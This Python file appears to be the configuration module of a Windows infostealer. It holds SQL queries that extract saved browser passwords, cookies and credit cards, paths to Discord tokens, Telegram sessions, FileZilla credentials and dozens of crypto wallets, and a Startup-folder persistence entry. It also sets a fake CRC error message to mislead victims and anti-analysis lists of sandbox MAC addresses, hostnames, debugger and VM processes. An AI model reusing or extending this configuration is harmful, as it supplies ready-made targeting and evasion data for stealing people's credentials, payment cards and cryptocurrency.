from enum import Enum
from os import environ
from getpass import getuser
from re import compile, IGNORECASE, DOTALL


sys_root = environ.get("SystemRoot", r"C:\Windows")
user_profile = environ.get("USERPROFILE")
user = getuser()
user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"


class Browsers(Enum):
    CHROME = "Chrome"
    OPERA_GX = "Opera GX"
    OPERA_DEFAULT = "Opera Default"
    EDGE = "Microsoft Edge"
    BRAVE = "Brave"
    VIVALDI = "Vivaldi"
    YANDEX = "Yandex"


class ChromiumConfig:

    BookmarksRegex = compile(r'"name":\s*"([^\'\"]*)"[\s\S]*"url":\s*"([^\'\"]*)"', IGNORECASE + DOTALL)

    PasswordsSQL = "SELECT action_url, username_value, password_value FROM logins"
    CookiesSQL = "SELECT host_key, name, encrypted_value FROM cookies"
    CardsSQL = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
    HistorySQL = "SELECT url FROM visits ORDER BY visit_time DESC LIMIT 30000"
    HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"

    PasswordsData = "URL: {0}\nUsername: {1}\nPassword: {2}\n\n"
    CookiesData = "{0}\tTRUE\t/\tFALSE\t2538097566\t{1}\t{2}"
    CardsData = "Username: {0}\nNumber: {1}\nExpire Month: {2}\nExpire Year: {3}\n\n"
    HistoryData = "URL: {0}\nTitle: {1}\nLast Visit: {2}\n\n"
    BookmarksData = "Title: {0}\nUrl: {1}\n\n"

    WalletLogs = [
        {
            "name": "Metamask",
            "folders": ["nkbihfbeogaeaoehlefnkodbefgpgknn", "djclckkglechooblngghdinmeemkbgci", "ejbalbakoplchlghecdalmeeeajnimhm"]
        },
        {
            "name": "Phantom",
            "folders": ["bfnaelmomeimhlpmgjnjophhpkkoljpa"]
        },
        {
            "name": "Binance",
            "folders": ["fhbohimaelbohpjbbldcngcnapndodjp"]
        },
        {
            "name": "Coinbase",
            "folders": ["hnfanknocfeofbddgcijnmhnfnkdnaad"]
        },
        {
            "name": "Trust",
            "folders": ["egjidjbpglichdcondbcbdnbeeppgdph"]
        },
        {
            "name": "Exodus",
            "folders": ["aholpfdialjgjfhomihkjbmgjidlcdno"]
        },
        {
            "name": "Xverse",
            "folders": ["idnnbdplmphpflfnlkomgpfbpcgelopg"]
        },
        {
            "name": "Unisat",
            "folders": ["ppbibelpcjmhbdihakflkdcoccbgbkpo"]
        },
        {
            "name": "OKX",
            "folders": ["mcohilncbfahbmgdjkbpemcciiolgcge"]
        },
        {
            "name": "Backpack",
            "folders": ["aflkmfhebedbjioipglgcbcmnbpgliof"]
        },
        {
            "name": "BNB Wallet",
            "folders": ["fhbohimaelbohpjbbldcngcnapndodjp"]
        },
        {
            "name": "Solflare",
            "folders": ["bhhhlbepdkbapadjdnnojkbgioiodbic"]
        },
        {
            "name": "Magic Eden",
            "folders": ["mkpegjkblkkefacfnmkajcjmabijhclg"]
        },
        {
            "name": "TronLink",
            "folders": ["ibnejdfjmmkpcnlpebklmnkoeoihofec"]
        },
        {
            "name": "Trust",
            "folders": ["egjidjbpglichdcondbcbdnbeeppgdph"]
        },
        {
            "name": "Bitget",
            "folders": ["jiidiaalihmmhddjgbnbgdfflelocpak"]
        },
        {
            "name": "Coin 98",
            "folders": ["aeachknmefphepccionboohckonoeemg"]
        },
        {
            "name": "Argent X",
            "folders": ["dlcobpjiigpikoobohmabehhmhfoodbb"]
        },
        {
            "name": "Keplr",
            "folders": ["dmkamcknogkgcdfhhbddcghachkejeap"]
        },
        {
            "name": "Martian",
            "folders": ["efbglgofoippbgcjepnhiblaibcnclgk"]
        },
        {
            "name": "Nami",
            "folders": ["lpfcbjknijpeeillifnkikgncikgfhdo"]
        },
        {
            "name": "Pontem",
            "folders": ["phkbamefinggmakgklpkljjmgibohnba"]
        },
        {
            "name": "Rabby",
            "folders": ["acmacodkjbdgmoleebolmdjonilkdbch"]
        },
        {
            "name": "Ronin",
            "folders": ["fnjhmkhhmkbjkkabndcnnogagogbneec"]
        },
        {
            "name": "Talisman",
            "folders": ["fijngjgcjhjmmpcmkeiomlglpeiijkld"]
        },
        {
            "name": "Temple",
            "folders": ["ookjlbkiijinhpmnjffcofjonbfbgaoc"]
        },
    ]


class MultihelpConfig:

    PoolSize = 5
    ZipName = f"{user}-st"

    BrowsersData = {
        Browsers.CHROME: {
            "path": rf"{user_profile}\AppData\Local\Google\Chrome\User Data",
            "process": "chrome.exe"
        },
        Browsers.OPERA_GX: {
            "path": rf"{user_profile}\AppData\Roaming\Opera Software\Opera GX Stable",
            "process": "opera.exe"
        },
        Browsers.OPERA_DEFAULT: {
            "path": rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable",
            "process": "opera.exe"
        },
        Browsers.EDGE: {
            "path": rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data",
            "process": "msedge.exe"
        },
        Browsers.BRAVE: {
            "path": rf"{user_profile}\AppData\Local\BraveSoftware\Brave-Browser\User Data",
            "process": "brave.exe"
        },
        Browsers.VIVALDI: {
            "path": rf"{user_profile}\AppData\Local\Vivaldi\User Data",
            "process": "vivaldi.exe"
        },
        Browsers.YANDEX: {
            "path": rf"{user_profile}\AppData\Local\Yandex\YandexBrowser\User Data",
            "process": "browser.exe"
        },
    }


class SystemConfig:

    User = user
    IPUrl = "https://ipinfo.io/json"
    SystemData = "User: {0}\nIP: {1}\nMachine Type: {2}\nOS Name: {3}\nMachine Name on Network: {4}\nMonitor: {5}\nCPU: {6}\nGPU: {7}\nRAM:\n{8}\nDrives:\n{9}"


class SenderConfig:

    UserAgent = user_agent


class AutostartConfig:

    AutostartName = "System"
    AutostartPath = rf"{user_profile}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"


class DiscordConfig:

    TokensPath = rf"{user_profile}\AppData\Roaming\Discord\Local Storage\leveldb"
    UserAgent = user_agent
    DiscordData = "Username: {0}\nEmail: {1}\nPhone: {2}\nBio: {3}\nToken: {4}\n\n"


class TelegramConfig:

    SessionsPath = rf"{user_profile}\AppData\Roaming\Telegram Desktop"


class FileZillaConfig:

    SitesPath = rf"{user_profile}\AppData\Roaming\FileZilla"
    DataFiles = ("recentservers.xml", "sitemanager.xml")
    FileZillaData = "Name: {0}\nUser: {1}\nPassword: {2}\nHost: {3}\nPort: {4}\n\n"


class MessageConfig:

    MessageTitle = "0x17"
    MessageDescription = "ERROR_CRC: Data error (cyclic redundancy check)."


class WalletsConfig:

    WalletPaths = [
        {
            "name": "Atomic",
            "path": rf"{user_profile}\AppData\Roaming\atomic\Local Storage\leveldb"
        },
        {
            "name": "Exodus",
            "path": rf"{user_profile}\AppData\Roaming\Exodus\exodus.wallet"
        },
        {
            "name": "Electrum",
            "path": rf"{user_profile}\AppData\Roaming\Electrum\wallets"
        },
        {
            "name": "Ethereum",
            "path": rf"{user_profile}\AppData\Roaming\Ethereum\keystore"
        },
        {
            "name": "Armory",
            "path": rf"{user_profile}\AppData\Roaming\Armory"
        },
        {
            "name": "Bytecoin",
            "path": rf"{user_profile}\AppData\Roaming\bytecoin"
        },
        {
            "name": "Guarda",
            "path": rf"{user_profile}\AppData\Roaming\Guarda\Local Storage\leveldb"
        },
        {
            "name": "Coinomi",
            "path": rf"{user_profile}\AppData\Local\Coinomi\Coinomi\wallets"
        },
        {
            "name": "Zcash",
            "path": rf"{user_profile}\AppData\Local\Zcash"
        },
    ]


class ProtectorConfig:

    MacAddresses = (
        "00:03:47:63:8b:de", "00:0c:29:05:d8:6e", "00:0c:29:2c:c1:21", "00:0c:29:52:52:50", "00:0d:3a:d2:4f:1f",
        "00:15:5d:00:00:1d", "00:15:5d:00:00:a4", "00:15:5d:00:00:b3", "00:15:5d:00:00:c3", "00:15:5d:00:00:f3",
        "00:15:5d:00:01:81", "00:15:5d:00:02:26", "00:15:5d:00:05:8d", "00:15:5d:00:05:d5", "00:15:5d:00:06:43",
        "00:15:5d:00:07:34", "00:15:5d:00:1a:b9", "00:15:5d:00:1c:9a", "00:15:5d:13:66:ca", "00:15:5d:13:6d:0c",
        "00:15:5d:1e:01:c8", "00:15:5d:23:4c:a3", "00:15:5d:23:4c:ad", "00:15:5d:b6:e0:cc", "00:1b:21:13:15:20",
        "00:1b:21:13:21:26", "00:1b:21:13:26:44", "00:1b:21:13:32:20", "00:1b:21:13:32:51", "00:1b:21:13:33:55",
        "00:23:cd:ff:94:f0", "00:25:90:36:65:0c", "00:25:90:36:65:38", "00:25:90:36:f0:3b", "00:25:90:65:39:e4",
        "00:50:56:97:a1:f8", "00:50:56:97:ec:f2", "00:50:56:97:f6:c8", "00:50:56:a0:06:8d", "00:50:56:a0:38:06",
        "00:50:56:a0:39:18", "00:50:56:a0:45:03", "00:50:56:a0:59:10", "00:50:56:a0:61:aa", "00:50:56:a0:6d:86",
        "00:50:56:a0:84:88", "00:50:56:a0:af:75", "00:50:56:a0:cd:a8", "00:50:56:a0:d0:fa", "00:50:56:a0:d7:38",
        "00:50:56:a0:dd:00", "00:50:56:ae:5d:ea", "00:50:56:ae:6f:54", "00:50:56:ae:b2:b0", "00:50:56:ae:e5:d5",
        "00:50:56:b3:05:b4", "00:50:56:b3:09:9e", "00:50:56:b3:14:59", "00:50:56:b3:21:29", "00:50:56:b3:38:68",
        "00:50:56:b3:38:88", "00:50:56:b3:3b:a6", "00:50:56:b3:42:33", "00:50:56:b3:4c:bf", "00:50:56:b3:50:de",
        "00:50:56:b3:91:c8", "00:50:56:b3:94:cb", "00:50:56:b3:9e:9e", "00:50:56:b3:a9:36", "00:50:56:b3:d0:a7",
        "00:50:56:b3:dd:03", "00:50:56:b3:ea:ee", "00:50:56:b3:ee:e1", "00:50:56:b3:f6:57", "00:50:56:b3:fa:23",
        "00:e0:4c:42:c7:cb", "00:e0:4c:44:76:54", "00:e0:4c:46:cf:01", "00:e0:4c:4b:4a:40", "00:e0:4c:56:42:97",
        "00:e0:4c:7b:7b:86", "00:e0:4c:94:1f:20", "00:e0:4c:b3:5a:2a", "00:e0:4c:b8:7a:58", "00:e0:4c:cb:62:08",
        "00:e0:4c:d6:86:77", "06:75:91:59:3e:02", "08:00:27:3a:28:73", "08:00:27:45:13:10", "12:1b:9e:3c:a6:2c",
        "12:8a:5c:2a:65:d1", "12:f8:87:ab:13:ec", "16:ef:22:04:af:76", "1a:6c:62:60:3b:f4", "1c:99:57:1c:ad:e4",
        "1e:6c:34:93:68:64", "2e:62:e8:47:14:49", "2e:b8:24:4d:f7:de", "32:11:4d:d0:4a:9e", "3c:ec:ef:43:fe:de",
        "3c:ec:ef:44:00:d0", "3c:ec:ef:44:01:0c", "3c:ec:ef:44:01:aa", "3e:1c:a1:40:b7:5f", "3e:53:81:b7:01:13",
        "3e:c1:fd:f1:bf:71", "42:01:0a:8a:00:22", "42:01:0a:8a:00:33", "42:01:0a:8e:00:22", "42:01:0a:96:00:22",
        "42:01:0a:96:00:33", "42:85:07:f4:83:d0", "4e:79:c0:d9:af:c3", "4e:81:81:8e:22:4e", "52:54:00:3b:78:24",
        "52:54:00:8b:a6:08", "52:54:00:a0:41:92", "52:54:00:ab:de:59", "52:54:00:b3:e4:71", "56:b0:6f:ca:0a:e7",
        "56:e8:92:2e:76:0d", "5a:e2:a6:a4:44:db", "5e:86:e4:3d:0d:f6", "60:02:92:3d:f1:69", "60:02:92:66:10:79",
        "7e:05:a3:62:9c:4d", "90:48:9a:9d:d5:24", "92:4c:a8:23:fc:2e", "94:de:80:de:1a:35", "96:2b:e9:43:96:76",
        "a6:24:aa:ae:e6:12", "ac:1f:6b:d0:48:fe", "ac:1f:6b:d0:49:86", "ac:1f:6b:d0:4d:98", "ac:1f:6b:d0:4d:e4",
        "b4:2e:99:c3:08:3c", "b4:a9:5a:b1:c6:fd", "b6:ed:9d:27:f4:fa", "be:00:e5:c5:0c:e5", "c2:ee:af:fd:29:21",
        "c8:9f:1d:b6:58:e4", "ca:4d:4b:ca:18:cc", "d4:81:d7:87:05:ab", "d4:81:d7:ed:25:54", "d6:03:e4:ab:77:8e",
        "ea:02:75:3c:90:9f", "ea:f6:f1:a2:33:76", "f6:a5:41:31:b2:78"
    )

    Computers = (
        "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH",
        "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6",
        "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS",
        "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH",
        "NETTYPC", "DESKTOP-BUGIO", "DESKTOP-CBGPFEE", "SERVER-PC", "TIQIYLA9TW5M", "DESKTOP-KALVINO", "COMPNAME_4047",
        "DESKTOP-19OLLTD", "DESKTOP-DE369SE", "EA8C2E2A-D017-4", "AIDANPC", "LUCAS-PC", "ACEPC", "MIKE-PC",
        "DESKTOP-IAPKN1P", "DESKTOP-NTU7VUO", "LOUISE-PC", "T00917", "test42", "DESKTOP-CM0DAW8"
    )

    Users = (
        "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH",
        "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29",
        "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ",
        "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", "WDAGUtilityAccount",
        "ink", "RDhJ0CNFevzX", "kEecfMwgj", "8Nl0ColNQ5bq", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b",
        "PqONjHVwexsS", "3u2v9m8", "HEUeRzl", "BvJChRPnsxn", "SqgFOf3G", "h7dk1xPr", "RGzcBUyrznReg", "OgJb6GqgK0O",
        "4CrA8IZTwHZe", "abhcolem", "28DnZnMtF0w", "4qZR8", "a7mEbvN6", "w5lwDo8hdU24", "ZGuuuZQW"
    )

    Tasks = (
        "ProcessHacker.exe", "httpdebuggerui.exe", "wireshark.exe", "fiddler.exe", "regedit.exe", "cmd.exe",
        "taskmgr.exe", "vboxservice.exe", "df5serv.exe", "processhacker.exe", "vboxtray.exe", "vmtoolsd.exe",
        "vmwaretray.exe", "vmwareservice.exe", "ida64.exe", "ollydbg.exe", "pestudio.exe", "vmwareuser.exe",
        "vgauthservice.exe", "vmacthlp.exe", "vmsrvc.exe", "x32dbg.exe", "x64dbg.exe", "x96dbg.exe", "vmusrvc.exe",
        "prl_cc.exe", "prl_tools.exe", "qemu-ga.exe", "joeboxcontrol.exe", "ksdumperclient.exe", "xenservice.exe",
        "joeboxserver.exe", "devenv.exe", "IMMUNITYDEBUGGER.EXE", "ImportREC.exe", "reshacker.exe", "windbg.exe",
        "32dbg.exe", "64dbg.exe", "protection_id.exe", "scylla_x86.exe", "scylla_x64.exe", "scylla.exe", "idau64.exe",
        "idau.exe", "idaq64.exe", "idaq.exe", "idaq.exe", "idaw.exe", "idag64.exe", "idag.exe", "ida64.exe", "ida.exe",
        "ollydbg.exe", "fakenet.exe", "dumpcap.exe"
    )

    Cards = (
        "virtualbox", "vmware"
    )

    RegistryEnums = (
        "vmware", "qemu", "virtio", "vbox", "xen", "VMW", "Virtual"
    )

    Dlls = (
        rf"{sys_root}\System32\vmGuestLib.dll",
        rf"{sys_root}\vboxmrxnp.dll"
    )

    IPUrl = "http://ip-api.com/line/?fields=hosting"
